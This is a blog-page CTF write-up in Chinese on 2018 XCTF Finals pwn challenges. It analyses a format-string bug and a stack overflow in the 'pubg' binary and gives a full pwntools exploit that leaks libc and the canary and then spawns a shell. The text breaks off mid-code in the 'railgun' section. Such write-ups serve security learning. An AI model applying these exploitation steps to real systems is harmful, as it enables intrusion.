<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="跟随航神、肖神等一众大神参加了2018 XCTF Finals虽然最后成绩不太好(我就是唯一拖后腿那个)，但跟着大佬们学到很多东西而且第二天pwnhub线下沙龙抽中了华为P20(happy&amp;&amp;会上干货满满，感受到大佬们的强大)感谢几位学长带飞，这里整理一下几个题目，因为是Finals，写的比较详(zhi)细(zhang) 0x01 pubg分析首先可以看到存在格式化字符串漏洞： 1">
<meta property="og:type" content="article">
<meta property="og:title" content="2018-XCTF Finals">
<meta property="og:url" content="http://yoursite.com/2018/11/10/2018-XCTF-Finals/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="跟随航神、肖神等一众大神参加了2018 XCTF Finals虽然最后成绩不太好(我就是唯一拖后腿那个)，但跟着大佬们学到很多东西而且第二天pwnhub线下沙龙抽中了华为P20(happy&amp;&amp;会上干货满满，感受到大佬们的强大)感谢几位学长带飞，这里整理一下几个题目，因为是Finals，写的比较详(zhi)细(zhang) 0x01 pubg分析首先可以看到存在格式化字符串漏洞： 1">
<meta property="article:published_time" content="2018-11-10T15:03:13.000Z">
<meta property="article:modified_time" content="2018-11-24T11:20:54.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>2018-XCTF Finals</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/11/19/LCTF2018-easy-heap-just-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/10/23/HITCON2018-Tcache/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/10/2018-XCTF-Finals/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&text=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&is_video=false&description=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2018-XCTF Finals&body=Check out this article: http://yoursite.com/2018/11/10/2018-XCTF-Finals/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&name=2018-XCTF Finals&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-pubg"><span class="toc-number">1.</span> <span class="toc-text">0x01 pubg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-railgun"><span class="toc-number">2.</span> <span class="toc-text">0x02  railgun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">2.1.</span> <span class="toc-text">main:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#menu"><span class="toc-number">2.2.</span> <span class="toc-text">menu:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sha256："><span class="toc-number">2.3.</span> <span class="toc-text">sha256：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-enc"><span class="toc-number">2.4.</span> <span class="toc-text">flag_enc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#程序流程"><span class="toc-number">2.5.</span> <span class="toc-text">程序流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞"><span class="toc-number">2.6.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#off-by-one"><span class="toc-number">2.6.1.</span> <span class="toc-text">off by one</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#UAF"><span class="toc-number">2.6.2.</span> <span class="toc-text">UAF:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AES"><span class="toc-number">2.6.3.</span> <span class="toc-text">AES</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#int-overflow"><span class="toc-number">2.6.4.</span> <span class="toc-text">int_overflow</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RSA-LSB-Oracle-Attack："><span class="toc-number">2.6.5.</span> <span class="toc-text">RSA LSB Oracle Attack：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.7.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2018-XCTF Finals
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-11-10T15:03:13.000Z" itemprop="datePublished">2018-11-10</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>跟随航神、肖神等一众大神参加了2018 XCTF Finals<br>虽然最后成绩不太好(我就是唯一拖后腿那个)，但跟着大佬们学到很多东西<br>而且第二天pwnhub线下沙龙抽中了华为P20(happy&amp;&amp;会上干货满满，感受到大佬们的强大)<br>感谢几位学长带飞，这里整理一下几个题目，因为是Finals，写的比较详(zhi)细(zhang)</p>
<h3 id="0x01-pubg"><a href="#0x01-pubg" class="headerlink" title="0x01 pubg"></a>0x01 pubg</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先可以看到存在格式化字符串漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for ( j &#x3D; 0; j &lt;&#x3D; 3; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  if ( s[j] !&#x3D; buf[j] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(s);                                &#x2F;&#x2F; 格式化字符串</span><br><span class="line">    puts(&quot; has no airdrop&quot;);</span><br><span class="line">    return __readfsqword(0x28u) ^ v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 2; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  if ( strstr(s, (const char *)*(&amp;off_564C5C3D70B0 + i)) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;error!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其对输入进行了过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000564C5C1D57A6 unk_564C5C1D57A6 db  24h ; $            ; DATA XREF: .data:off_564C5C3D70B0↓o</span><br><span class="line">.rodata:0000564C5C1D57A7                 db    0</span><br><span class="line">.rodata:0000564C5C1D57A8 unk_564C5C1D57A8 db  6Eh ; n            ; DATA XREF: .data:0000564C5C3D70B8↓o</span><br><span class="line">.rodata:0000564C5C1D57A9                 db    0</span><br><span class="line">.rodata:0000564C5C1D57AA unk_564C5C1D57AA db  2Ah ; *</span><br></pre></td></tr></table></figure>
<p><strong>输入的字符串不能包含”$”/“n”/“*“<br>这里patch的时后改printf为puts不能过check<br>最后我将”*“改为”%”，过滤掉”%”<br>不过有一支队伍一直可以打过来，猜测是一直连着我们的shell，没有断开<br>最后在流量中果然只有一句”cat flag”,orz</strong><br><strong>这里可以利用”%x%x%x%p”来leak libc</strong><br><strong>同时第二个%x会leak edx的值：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:000055FCB7F095D2 movzx   ecx, [rbp+rax+s]</span><br><span class="line">.text:000055FCB7F095D7 mov     eax, [rbp+var_24]</span><br><span class="line">.text:000055FCB7F095DA movsxd  rdx, eax</span><br><span class="line">.text:000055FCB7F095DD lea     rax, buf</span><br><span class="line">.text:000055FCB7F095E4 movzx   eax, byte ptr [rdx+rax]</span><br><span class="line">.text:000055FCB7F095E8 cmp     cl, al</span><br><span class="line">.text:000055FCB7F095EA jz      short loc_55FCB7F0960B</span><br><span class="line">.text:000055FCB7F095EC lea     rax, [rbp+s]</span><br><span class="line">.text:000055FCB7F095F0 mov     rdi, rax                        ; format</span><br><span class="line">.text:000055FCB7F095F3 mov     eax, 0</span><br><span class="line">.text:000055FCB7F095F8 call    printf</span><br></pre></td></tr></table></figure>
<p>可以看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edx-&gt;eax-&gt;rbp+var_24-&gt;当前循环j值-&gt;已经猜对的位数</span><br></pre></td></tr></table></figure>
<p>因此利用第二个数可以很快爆破出三位password(第四位恒为”\x00”)<br>继续往下可以看到栈溢出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 fight()</span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]</span><br><span class="line">  __int16 v2; &#x2F;&#x2F; [rsp+6h] [rbp-Ah]</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v2 &#x3D; 0;</span><br><span class="line">  v1 &#x3D; 0x20;</span><br><span class="line">  puts(&quot;the robot has ghillie suit, so you can only see it once&quot;);</span><br><span class="line">  while ( *(_DWORD *)(98k + 20) &gt; 0 &amp;&amp; *((_DWORD *)my_gun + 5) &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)my_gun + 5) -&#x3D; *(_DWORD *)(98k + 16);</span><br><span class="line">    if ( v2 &#x3D;&#x3D; 1 )</span><br><span class="line">      *(_DWORD *)(98k + 20) -&#x3D; *((_DWORD *)my_gun + 4);</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *((_DWORD *)my_gun + 5) &lt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You&#39;re killed by 98K&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Winner winner,chicken dinner. The whole memory is yours, now pick one chicken:&quot;);</span><br><span class="line">    leak_any(&amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到当fight成功时会调用leak_any(&amp;v1)<br>这里注意：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__int16 v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]</span><br><span class="line">__int16 v2; &#x2F;&#x2F; [rsp+6h] [rbp-Ah]</span><br></pre></td></tr></table></figure>
<p>而在leak_any中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall leak_any(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; ST18_8</span><br><span class="line"></span><br><span class="line">  LODWORD(read_size) &#x3D; *a1;</span><br><span class="line">  v1 &#x3D; get_num_();</span><br><span class="line">  printf(&quot;The %s chicken is on your plate, enjoy it~\n&quot;, v1);</span><br><span class="line">  return get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>会将传入的参数视为DWORD*<br>所以，当传入参数时fight的v2不为0， LODWORD(read_size) = *a1;则会将read_size设置为一个很大的数，而在get_flag中：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 get_flag()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v2; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">  read_note((__int64)&amp;s, read_size);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>可以看到会 read_note((__int64)&amp;s, read_size)，当read_size非常大时便会栈溢出(s的缓冲区长度-&gt;0x30-0x8=0x28)</strong><br>故而：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1  需要fight成功(至少调用过fight的while循环，此时v2一定不为0)-&gt;栈溢出</span><br><span class="line">2  栈溢出需要leak canary</span><br></pre></td></tr></table></figure>
<p>根据程序流fight成功只需要拿到AWM即可(爆破3位password)<br>leak canary：<br>首先想到使用libc地址leak _environ,然后找到栈中一个cannary的地址来leak canary，不过因为格式化字符串的长度限制，以及只有一次任意地址读，没办法实现，只能从能用leak libc后直接一步确定的地址来leak canary<br><strong>这里不太明白这个地址处为何存在canary，准备研究一下canary的具体底层原理：<br>动态调试中，我在leak libc的那个地址(即格式化字符串中利用r8寄存器%p得到的地址)周围搜索canary，找到偏移0x28处即存在canary，然后在fight成功后有一次任意地址读取即可leak 0x29偏移处(canary最低位为”\x00”,故而leak 0x28+1位置)的%s，即可得到canary</strong><br><strong>leak canary后，正常的栈溢出，覆盖返回地址为one_gadget,同时用”\x00”填充栈来满足one_gadget条件即可：</strong></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">    p.sendline(&quot;%x%x%x%p&quot;)</span><br><span class="line">    p.recv(5)</span><br><span class="line">    return int(p.recvuntil(&quot;\n&quot;).strip(),16)</span><br><span class="line"></span><br><span class="line">def get_pass():</span><br><span class="line">  ans&#x3D;&quot;&quot;</span><br><span class="line">  for i in range(3):</span><br><span class="line">   for j in range(1,256):</span><br><span class="line">     payload&#x3D;ans+chr(j)+&quot;%x%x&quot;</span><br><span class="line">     payload&#x3D;payload.replace(&quot;$&quot;,&quot; &quot;).replace(&quot;n&quot;,&quot; &quot;).replace(&quot;*&quot;,&quot; &quot;)</span><br><span class="line">     p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">     p.sendline(&quot;2&quot;)</span><br><span class="line">     p.recvuntil(&quot;\n&quot;)</span><br><span class="line">     p.sendline(payload)</span><br><span class="line">     p.recvuntil(&quot;2a&quot;)</span><br><span class="line">     k&#x3D;p.recv(1)</span><br><span class="line">     if k&#x3D;&#x3D;str(i+1):</span><br><span class="line">        ans+&#x3D;chr(j)</span><br><span class="line">        break</span><br><span class="line">  p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">  p.sendline(&quot;2&quot;)</span><br><span class="line">  p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">  p.sendline(ans+&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;pubg&quot;)</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">libc_addr&#x3D;leak_libc()-0x5cf700</span><br><span class="line">print &quot;libc:&#123;&#125;&quot;.format(hex(libc_addr))</span><br><span class="line"></span><br><span class="line">#get AWM</span><br><span class="line">get_pass()</span><br><span class="line"></span><br><span class="line">#leak canary</span><br><span class="line">canary_addr&#x3D;libc_addr+0x5cf700+0x29</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;:\n&quot;)</span><br><span class="line">p.sendline(str(canary_addr))</span><br><span class="line">p.recvuntil(&quot;The &quot;)</span><br><span class="line">canary&#x3D;&quot;\x00&quot;+p.recv(7)</span><br><span class="line">print &quot;canary:&#123;&#125;&quot;.format(hex(u64(canary)))</span><br><span class="line"></span><br><span class="line">#get shell</span><br><span class="line">p.recvuntil(&quot;~\n&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+canary+&quot;a&quot;*8+p64(libc_addr+0x4526a)+&quot;\x00&quot;*0x40</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x02-railgun"><a href="#0x02-railgun" class="headerlink" title="0x02  railgun"></a>0x02  railgun</h3><p>比赛时候飞神第一天晚上秒的题(膜启飞学长)，照着exp复现一下:</p>
<h4 id="main"><a href="#main" class="headerlink" title="main:"></a>main:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; &#x2F;&#x2F; rsi</span><br><span class="line">  int v4; &#x2F;&#x2F; eax</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+4h] [rbp-1Ch]</span><br><span class="line">  signed int j; &#x2F;&#x2F; [rsp+4h] [rbp-1Ch]</span><br><span class="line">  signed int v8; &#x2F;&#x2F; [rsp+8h] [rbp-18h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  char nptr[5]; &#x2F;&#x2F; [rsp+13h] [rbp-Dh]</span><br><span class="line">  unsigned __int64 v12; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line">  __int64 savedregs; &#x2F;&#x2F; [rsp+20h] [rbp+0h]</span><br><span class="line"></span><br><span class="line">  v12 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; 0LL;</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  info1();</span><br><span class="line">  sha256__0();</span><br><span class="line">  flag_enc();</span><br><span class="line">  while ( 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 &#x3D; menu();</span><br><span class="line">    switch ( (unsigned int)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        puts(&quot;[+]modify player information&quot;);</span><br><span class="line">        printf(&quot;[-]description:&quot;, v3);</span><br><span class="line">        v4 &#x3D; read_nSize((__int64)description_addr, 255);</span><br><span class="line">        *((_BYTE *)description_addr + v4) &#x3D; 